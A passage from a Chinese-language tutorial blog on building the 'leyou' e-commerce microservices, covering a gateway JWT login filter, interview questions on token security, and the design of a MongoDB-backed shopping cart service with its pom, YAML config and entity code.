log.error(<span class="string">&quot;用户非法访问资源：&#123;&#125;&quot;</span>, request.getPath());</span><br><span class="line">            <span class="comment">//  - 解析不通过，返回401</span></span><br><span class="line">            exchange.getResponse().setStatusCode(HttpStatus.UNAUTHORIZED);</span><br><span class="line">            <span class="keyword">return</span> exchange.getResponse().setComplete();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            log.error(<span class="string">&quot;服务解析用户信息失败&quot;</span>, e);</span><br><span class="line">            <span class="comment">// 内部异常，返回500</span></span><br><span class="line">            exchange.getResponse().setStatusCode(HttpStatus.INTERNAL_SERVER_ERROR);</span><br><span class="line">            <span class="keyword">return</span> exchange.getResponse().setComplete();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getOrder</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 最高优先级</span></span><br><span class="line">        <span class="keyword">return</span> Ordered.HIGHEST_PRECEDENCE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 判断一个请求是否是白名单中的请求</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> request 请求对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> true：是白名单请求； false：不是白名单请求</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isAllowRequest</span><span class="params">(ServerHttpRequest request)</span> &#123;</span><br><span class="line">        <span class="comment">// 1.获取当前请求的path和method</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> request.getPath().toString();</span><br><span class="line">        <span class="type">String</span> <span class="variable">method</span> <span class="operator">=</span> request.getMethodValue();</span><br><span class="line">        <span class="comment">// 2.遍历白名单</span></span><br><span class="line">        Map&lt;String, Set&lt;String&gt;&gt; allowRequests = filterProp.getAllowRequests();</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Set&lt;String&gt;&gt; entry : allowRequests.entrySet()) &#123;</span><br><span class="line">            <span class="comment">// 3.获取允许的path和允许的methods</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">allowPathPrefix</span> <span class="operator">=</span> entry.getKey();</span><br><span class="line">            Set&lt;String&gt; allowMethods = entry.getValue();</span><br><span class="line">            <span class="comment">// 4.判断是否允许</span></span><br><span class="line">            <span class="keyword">if</span> (StringUtils.startsWith(path, allowPathPrefix) &amp;&amp; allowMethods.contains(method)) &#123;</span><br><span class="line">                <span class="comment">// 是许可的路径，返回true</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 不是白名单请求，返回false</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="面试常见问题"><a href="#面试常见问题" class="headerlink" title="面试常见问题"></a>面试常见问题</h2><h3 id="jwt和security的对比："><a href="#jwt和security的对比：" class="headerlink" title="jwt和security的对比："></a>jwt和security的对比：</h3><p>JWT的：</p>
<ul>
<li><p>优点：</p>
<ul>
<li>无需再服务端存储用户数据，减轻服务端压力</li>
<li>轻量级，json风格，比较简单</li>
<li>跨语言</li>
</ul>
</li>
<li><p>有利于水平扩展</p>
</li>
<li><p>缺点：</p>
<ul>
<li>token一旦签发，无法修改<ul>
<li>无法更新token有效期，用户登录状态刷新难以实现</li>
<li>无法销毁一个token，服务端不能对用户状态进行绝对控制</li>
</ul>
</li>
<li>不包含权限控制</li>
</ul>
</li>
</ul>
<p>SpringSecurity：</p>
<ul>
<li><p>优点：</p>
<ul>
<li>用户信息保存再服务端，服务端可以对用户状态绝对控制</li>
<li>基于Spring，无缝整合，修改登录逻辑，其实就是添加过滤器</li>
<li>整合权限管理</li>
</ul>
</li>
<li><p>缺点：</p>
<ul>
<li>限定了语言</li>
<li>实现复杂，基于一连串的过滤器链</li>
<li>需要再服务端保存用户信息，增加服务端压力</li>
<li>依赖于tomcat的HttpSession、如果是分布式项目，session不共享，登录失效，需要借助于SpringSession，实现共享session效果（利用redis代替tomcat的session）</li>
</ul>
</li>
</ul>
<h3 id="登录控制问题"><a href="#登录控制问题" class="headerlink" title="登录控制问题"></a>登录控制问题</h3><ul>
<li><p>你们使用JWT做登录凭证，如何解决token注销问题</p>
<p>答：jwt的缺陷是token生成后无法修改，因此无法让token失效。只能采用其它方案来弥补，基本思路如下：</p>
<p>  1）用户登录后，生成JWT，其中包含用户身份</p>
<p>  2）以用户id为key，把JWT的id存入redis，只有redis中有id的JWT，才是有效的JWT</p>
<p>  3）并且给Redis设置有效期，有效期到自动删除</p>
<p>  4）退出登录时，把ID从Redis删除即可</p>
</li>
<li><p>怎么解决登录超时后的登录续签问题？</p>
<p>答：判断登录是否超时的标准是redis，而不是JWT，因此每次用户访问网关，我们都会刷新redis的数据有效期，保证登录状态不断。</p>
</li>
<li><p>如何解决异地登录或跨设备登录问题？</p>
<p>答：</p>
<p>方案一：不允许多端登录</p>
<p>如果账户在第二个设备登录，自然会将redis中的JWT覆盖，那么之前的登录凭证就成了无效凭证。</p>
<p>方案二：允许多端登录</p>
<p>存入redis时，redis的类型可以选择set，这样一个用户可以具备多个JWT的id，实现多端登录。</p>
</li>
</ul>
<h3 id="cookie安全问题"><a href="#cookie安全问题" class="headerlink" title="cookie安全问题"></a>cookie安全问题</h3><ul>
<li><p>如何解决token被篡改问题？</p>
<ul>
<li>答：token中的数据可以篡改，但是签名无法篡改，否则服务端认证根本不会通过，因此篡改的token是无法通过服务端校验的</li>
</ul>
</li>
<li><p>如何防止token的伪造</p>
<p>与上个问题类似，token中带有签名认证，而签名需要私钥加密生成。只要私钥不泄露，就不可能有人伪造token，因为其它秘钥生成的token是不会被公钥认可的。</p>
</li>
<li><p>如何解决cookie被盗用问题？</p>
<p>答：cookie被盗用的可能性主要包括下面几种：</p>
<ul>
<li><p>XSS攻击：这个可以再前端页面渲染时对 数据做安全处理即可，而且我们的cookie使用了Httponly为true，可以防止JS脚本的攻击。</p>
</li>
<li><p>CSRF攻击：</p>
<ul>
<li>利用Referer头，防盗链</li>
<li>请求头中加随机码</li>
</ul>
</li>
<li><p>数据抓包，获取用户cookie：我们采用了HTTPS协议通信，无法获取请求的任何数据</p>
</li>
<li><p>请求重放攻击：对于普通用户的请求没有对请求重放做防御，而是对部分业务做好了幂等处理。运行管理系统中会对token添加随机码，认证token一次有效，来预防请求重放攻击。</p>
<p>(1)**加<a href="https://baike.baidu.com/item/%E9%9A%8F%E6%9C%BA%E6%95%B0/2454368">随机数</a>**。该方法优点是认证双方不需要时间同步，双方记住使用过的<a href="https://baike.baidu.com/item/%E9%9A%8F%E6%9C%BA%E6%95%B0">随机数</a>，如发现<a href="https://baike.baidu.com/item/%E6%8A%A5%E6%96%87">报文</a>中有以前使用过的随机数，就认为是重放攻击。缺点是需要额外保存使用过的随机数，若记录的时间段较长，则保存和查询的开销较大。 [4] </p>
<p>(2)**加<a href="https://baike.baidu.com/item/%E6%97%B6%E9%97%B4%E6%88%B3">时间戳</a>**。该方法优点是不用额外保存其他信息。缺点是认证双方需要准确的时间同步，同步越好，受攻击的可能性就越小。但当系统很庞大，跨越的区域较广时，要做到精确的时间同步并不是很容易。 [4] </p>
<p>(3)**加<a href="https://baike.baidu.com/item/%E6%B5%81%E6%B0%B4%E5%8F%B7/5623476">流水号</a>**。就是双方在报文中添加一个逐步递增的整数，只要接收到一个不连续的流水号报文(太大或太小)，就认定有重放威胁。该方法优点是不需要时间同步，保存的信息量比随机数方式小。缺点是一旦攻击者对报文解密成功，就可以获得流水号，从而每次将流水号递增欺骗认证端。</p>
</li>
<li><p>用户电脑中毒：这个无法防范。</p>
</li>
</ul>
</li>
<li><p>用户的cookie被禁用怎么办？</p>
<ul>
<li>cookie一般情况下，是不会被禁用，因为普通人根本不知道是什么是cookie，一般不用管，为了友好，我们可以给用户一个提示：你的cookie已经被禁用了，请启用cookie。</li>
<li>把jwt作为响应头返回，浏览器中JS把token写到本地存储（sessionStorage），要求前端每次发ajax，都必须自己携带token。而且有被xss攻击的风险</li>
</ul>
</li>
</ul>
<h3 id="权限问题"><a href="#权限问题" class="headerlink" title="权限问题"></a>权限问题</h3><ul>
<li><p>如何完成权限校验的？</p>
<ul>
<li>首先我们有权限管理的服务，管理用户的各种权限，及可访问路径等</li>
<li>在网关中利用过滤器，拦截一切请求，在过滤器中，解析和验证jwt，获取用户身份，查询用户权限，判断用户身份可以访问当前路径</li>
</ul>
</li>
<li><p>服务端微服务地址不小心暴露了，用户就可以绕过网关，直接访问微服务，怎么办？</p>
<ul>
<li><p>首先，我们的微服务隐藏在网关的后面，而且整个服务被Nginx反向代理，用户只能看到nginx的地址，微服务暴露的可能性很低。</p>
</li>
<li><p>兜底方案：</p>
<ul>
<li>如果担心服务安全，我们可以将登录校验和权限校验分离。在网关中只负责登录校验功能，在每个微服务处理用户权限。这样即便有人绕过了网关访问，只要权限不通过，依然无法访问。</li>
<li>用户请求到网关，网关会生成一个新的令牌，这个令牌包含用户信息，仅在访问微服务时使用，被访问的微服务会校验这个内部令牌，从而验证请求者是不是内部的微服务</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="单点登录问题"><a href="#单点登录问题" class="headerlink" title="单点登录问题"></a>单点登录问题</h3><p>单点登录，顾名思义：在分布式服务中，用户只需要在一处登录，即可在各个受信任的服务器之间，共享登录状态，称为单点登录</p>
<p>任何登录都离不开cookie，如果cookie无法使用或共享，就会导致登录凭证无法共享，导致登录状态无法共享。例如因为跨域名的多个服务，其cookie不可共享，导致登录失效。</p>
<p>因此实现单点登录有多种方式，其区别就在于是否能解决跨域登录</p>
<ul>
<li>同域名单点登录<ul>
<li>分布式服务共享二级域名，二级以上域名不同，此时cookie可以共享。解决思路：<ul>
<li>JWT无状态登录</li>
<li>共享Session</li>
</ul>
</li>
</ul>
</li>
<li>跨域单点登录<ul>
<li>服务二级域名就不同，导致cookie无法共享，解决办法：<ul>
<li>OAuth协议实现单点登录：<a href="http://www.ruanyifeng.com/blog/2019/04/oauth_design.html">Oauth2.0协议</a>，成熟的框架：<a href="https://blog.csdn.net/anumbrella/article/details/80821486">CAS</a></li>
<li>跨域跳转时，传递cookie数据，从而共享cookie</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>CAS原理图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022694.png"></p>
<h1 id="购物车功能"><a href="#购物车功能" class="headerlink" title="购物车功能"></a>购物车功能</h1><h2 id="购物车功能分析"><a href="#购物车功能分析" class="headerlink" title="购物车功能分析"></a>购物车功能分析</h2><h3 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h3><p>需求描述：</p>
<ul>
<li>用户可以在登录状态下将商品添加到购物车</li>
<li>用户可以在未登录状态下将商品添加到购物车</li>
<li>用户可以使用购物车一起结算下单</li>
<li>用户可以查询自己的购物车</li>
<li>用户可以在购物车中可以修改购买商品的数量。</li>
<li>用户可以在购物车中删除商品。</li>
<li>用户可以<em>在购物车中看到商品满足的优惠信息</em></li>
<li>用户可以看到购物车商品价格变化</li>
<li>用户可以看到购物车商品是否下架</li>
<li>用户可以看到购物车商品库存是否充足</li>
<li>用户可以对商品批量结算下单</li>
</ul>
<p>需求描述的方式，用户故事</p>
<h3 id="业务分析"><a href="#业务分析" class="headerlink" title="业务分析"></a>业务分析</h3><p>在需求描述中，不管用户是否登录，都需要实现加入购物车功能，那么已登录和未登录下，购物车数据应该存放在哪里呢？</p>
<blockquote>
<p>未登录购物车</p>
</blockquote>
<p>用户如果未登录，将数据保存在服务端存在一些问题：</p>
<ul>
<li>无法确定用户身份，需要借助与客户端存储识别身份</li>
<li>服务端数据存储压力增加，而且可能是无效数据</li>
</ul>
<p>那么我们应该用把数据保存在客户端（浏览器），这样每个用户保存自己的数据，就不存在身份识别的问题了，而且也解决了服务端数据存储压力问题。</p>
<blockquote>
<p>已登录购物车</p>
</blockquote>
<p>用户登录时，数据保存在哪里呢？</p>
<p>大家首先想到的应该是数据库，不过购物车数据比较特殊：</p>
<ul>
<li>读和写都比较频繁</li>
<li>数据安全性要求不高</li>
<li>数据没有事务需求</li>
</ul>
<p>这样的数据存储数据库有些浪费。因此我们可以考虑存入NoSql库中，例如：Redis、Elasticsearch、MongoDB等。</p>
<p>这里我们采用MongoDB作为购物车存储方案。</p>
<h2 id="未登录购物车"><a href="#未登录购物车" class="headerlink" title="未登录购物车"></a>未登录购物车</h2><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><p>首先分析一下未登录购物车的数据结构。</p>
<p>我们看下页面展示需要什么数据：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022695.png" alt="image-20200331111408989"></p>
<p>因此每一个购物车信息，都是一个对象，包含：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">skuId</span>:<span class="number">2131241</span>,</span><br><span class="line">    <span class="attr">title</span>:<span class="string">&quot;小米6&quot;</span>,</span><br><span class="line">    <span class="attr">image</span>:<span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">price</span>:<span class="number">190000</span>,</span><br><span class="line">    <span class="attr">num</span>:<span class="number">1</span>,</span><br><span class="line">    <span class="attr">spec</span>:<span class="string">&quot;&#123;&quot;</span><span class="number">4</span><span class="string">&quot;:&quot;</span>陶瓷黑尊享版<span class="string">&quot;,&quot;</span><span class="number">12</span><span class="string">&quot;:&quot;</span>6GB<span class="string">&quot;,&quot;</span><span class="number">13</span><span class="string">&quot;:&quot;</span>128GB<span class="string">&quot;&#125;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>另外，购物车中不止一条数据，因此最终会是对象的数组。即：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;...&#125;,&#123;...&#125;,&#123;...&#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>



<h3 id="web本地存储"><a href="#web本地存储" class="headerlink" title="web本地存储"></a>web本地存储</h3><p>知道了数据结构，下一个问题，就是如何保存购物车数据。</p>
<p>我们不采用cookie存储，原因：</p>
<ul>
<li>cookie有大小限制</li>
<li>cookie会随请求，自动携带到服务端，会增加请求的头大小，占用过多带宽，影响服务并发能力</li>
</ul>
<p>前面我们分析过，可以使用Localstorage来实现。Localstorage是web本地存储的一种，那么，什么是web本地存储呢？</p>
<h4 id="什么是web本地存储？"><a href="#什么是web本地存储？" class="headerlink" title="什么是web本地存储？"></a>什么是web本地存储？</h4><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022696.png" alt="1527587496457"></p>
<p>web本地存储主要有两种方式：</p>
<ul>
<li>LocalStorage：localStorage 方法存储的数据没有时间限制。第二天、第二周或下一年之后，数据依然可用。 </li>
<li>SessionStorage：sessionStorage 方法针对一个 session 进行数据存储。当用户关闭浏览器窗口后，数据会被删除。</li>
</ul>
<p>Localstorage和sessionStorage的本质都时一个JS的对象</p>
<p>对象怎么操作，LocalStorage就怎么操作。</p>
<h4 id="LocalStorage的用法"><a href="#LocalStorage的用法" class="headerlink" title="LocalStorage的用法"></a>LocalStorage的用法</h4><p>语法非常简单：</p>
<p> <img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022698.png" alt="1527587857321"></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>); <span class="comment">// 存储数据</span></span><br><span class="line"><span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="string">&quot;key&quot;</span>); <span class="comment">// 获取数据</span></span><br><span class="line"><span class="variable language_">localStorage</span>.<span class="title function_">removeItem</span>(<span class="string">&quot;key&quot;</span>); <span class="comment">// 删除数据</span></span><br></pre></td></tr></table></figure>

<p>注意：<strong>localStorage和SessionStorage都只能保存字符串</strong>。</p>
<p>不过，在我们的common.js中，已经对localStorage进行了简单的封装：</p>
<p> <img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022699.png" alt="1527588011623"></p>
<p>示例：</p>
<p> <img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022700.png" alt="1527588112975"></p>
<h3 id="未登录购物车演示"><a href="#未登录购物车演示" class="headerlink" title="未登录购物车演示"></a>未登录购物车演示</h3><p>购物车的前端js和页面都已经实现好了，我们在商品详情页面，点击加入购物车按钮：</p>
<p> <img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022701.png" alt="1535969897212"></p>
<p>即可将数据加入localstorage中：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022702.png" alt="1535632873353"></p>
<p>同时，页面会跳转到购物车列表页面并显示购物车信息：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022703.png"></p>
<h2 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h2><p>已登录购物车我们计划存储在MongoDB服务器，那么MongoDB该如何使用呢？</p>
<p>大家参考课前资料提供的文档：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022704.png" alt="image-20200322214142849"> </p>
<h2 id="搭建交易微服务"><a href="#搭建交易微服务" class="headerlink" title="搭建交易微服务"></a>搭建交易微服务</h2><p>接下来是已登录的购物车，我们需要创建独立微服务，实现购物车功能。这里我们创建一个交易微服务，其中会包含用户交易相关的功能：</p>
<ul>
<li>购物车</li>
<li>订单</li>
<li>支付等</li>
</ul>
<h3 id="创建module"><a href="#创建module" class="headerlink" title="创建module"></a>创建module</h3><p>项目坐标：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022705.png" alt="image-20200322213005912"></p>
<p>位置：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022706.png" alt="image-20200322213015331"></p>
<h3 id="pom依赖"><a href="#pom依赖" class="headerlink" title="pom依赖"></a>pom依赖</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>leyou<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.leyou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ly-trade<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--web依赖--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--eureka--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-eureka-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--common--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.leyou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ly-common<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--mongoDB的starter--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-mongodb<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>在application.yml文件中添加下面内容：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8087</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">trade-service</span></span><br><span class="line">  <span class="attr">data:</span></span><br><span class="line">    <span class="attr">mongodb:</span></span><br><span class="line">      <span class="attr">uri:</span> <span class="string">mongodb://leyou:123@ly-mongo/carts</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://ly-registry:10086/eureka</span></span><br><span class="line"><span class="attr">logging:</span></span><br><span class="line">  <span class="attr">level:</span></span><br><span class="line">    <span class="attr">com.leyou:</span> <span class="string">debug</span></span><br></pre></td></tr></table></figure>

<h3 id="启动类"><a href="#启动类" class="headerlink" title="启动类"></a>启动类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.trade;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> 虎哥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SpringBootApplication(scanBasePackages = &#123;&quot;com.leyou.trade&quot;, &quot;com.leyou.common.advice&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LyTradeApplication</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(LyTradeApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="网关路由"><a href="#网关路由" class="headerlink" title="网关路由"></a>网关路由</h3><p>在<code>ly-gateway</code>中的<code>application.yml</code>文件中添加路由：</p>
 <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">ly-gateway</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">gateway:</span></span><br><span class="line">      <span class="comment"># ...</span></span><br><span class="line">      <span class="attr">routes:</span></span><br><span class="line">	  <span class="comment"># ...</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">trade-service</span> <span class="comment"># 交易服务</span></span><br><span class="line">        <span class="attr">uri:</span> <span class="string">lb://trade-service</span></span><br><span class="line">        <span class="attr">predicates:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">Path=/trade/**</span></span><br></pre></td></tr></table></figure>



<h2 id="已登录购物车"><a href="#已登录购物车" class="headerlink" title="已登录购物车"></a>已登录购物车</h2><p>接下来，我们完成已登录购物车。</p>
<h3 id="数据结构分析"><a href="#数据结构分析" class="headerlink" title="数据结构分析"></a>数据结构分析</h3><p>已登录购物车会存入MongoDB，那么以怎样的形式存储呢？</p>
<p>将来我们会有很多的用户，每个用户购物车中都会收藏很多商品信息，将来可以对其中的商品进行增删改查操作，因此我们数据存储必须满足的需求包括：</p>
<ul>
<li>快速根据用户找到对应的购物车</li>
<li>在用户购物车中快速定位某个商品</li>
</ul>
<p>MongoDB有集合的概念，一个集合中可以包含很多个文档，因此我们可以这样：</p>
<ul>
<li>为<strong>每个用户创建一个集合，作为这个用户的购物车</strong>，用户id作为集合名一部分</li>
<li>集合中<strong>文档是购物车中的商品对象</strong>，并且<strong>为商品id建立索引</strong>，方便查找商品。</li>
</ul>
<p>当然，购物车中的商品信息需要一个实体类来表示：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.trade.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.annotation.Id;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.mongodb.core.mapping.Document;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CartItem</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Long skuId;<span class="comment">// 商品id</span></span><br><span class="line">    <span class="keyword">private</span> String title;<span class="comment">// 标题</span></span><br><span class="line">    <span class="keyword">private</span> String image;<span class="comment">// 图片</span></span><br><span class="line">    <span class="keyword">private</span> Long price;<span class="comment">// 加入购物车时的价格</span></span><br><span class="line">    <span class="keyword">private</span> Integer num;<span class="comment">// 购买数量</span></span><br><span class="line">    <span class="keyword">private</span> String spec;<span class="comment">// 商品规格参数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="获取登录用户信息"><a href="#获取登录用户信息" class="headerlink" title="获取登录用户信息"></a>获取登录用户信息</h3><p>既然要把用户id作为集合名称一部分，我们就必须想办法在请求进入交易服务时就获取用户信息，并且将当前用户信息与当前请求线程绑定。</p>
<p>其中有两个事情需要我们去思考：</p>
<ul>
<li>如何在请求进入后获取登录用户信息</li>
<li>如何将用户信息与当前请求线程绑定</li>
</ul>
<h4 id="获取用户思路分析"><a href="#获取用户思路分析" class="headerlink" title="获取用户思路分析"></a>获取用户思路分析</h4><p>要获取登录的用户信息，有以下几种方式：</p>
<ul>
<li>方式一：页面直接把用户作为请求参数传递<ul>
<li>优点：简单，方便，代码量为0</li>
